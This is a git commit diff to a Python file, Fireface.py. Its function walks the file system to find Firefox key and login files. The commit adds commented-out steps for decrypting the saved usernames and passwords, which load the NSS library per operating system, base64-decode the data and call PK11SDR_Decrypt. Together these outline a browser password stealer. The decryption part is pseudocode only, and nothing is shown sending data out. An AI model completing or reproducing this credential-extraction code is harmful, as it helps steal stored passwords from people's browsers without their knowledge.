b9b90b94159806a10c2cc40116b64920c7a25386
Grima <dawnvibration@protonmail.com>
2024-07-24 12:33:18 -0500

    Norm

--- Fireface.py
+++ Fireface.py
@@ -35,3 +35,22 @@ def fireFoxWalk():
                     loginFile = os.path.abspath(os.path.join(root, name))
     # Returns the file path of the key and logins files.
     return keyFile, loginFile
+
+
+#Decrypt Function
+
+#Need to load library based on OS:
+    #Windows = nss3.dll
+    #MacOS = libnss3.dylib
+    #Linux = libnss3.so
+    
+    # Step 1: Convert Data
+    # Convert the username and password from base64 to string
+        # data = b64decode(data64)
+    # Step 2: Pass the String
+    # Pass the string data into the SECItem object as input data.
+        # input = SECITEM(0, data, len(data))
+    # Step 3: Create a SECItem object to store the decrypted output data.
+        # output = SECITEM(0, None, 0)
+    # Step 4: Perform PK11 Decryption
+        # PK11SDR_Decrypt(inp, out, None)
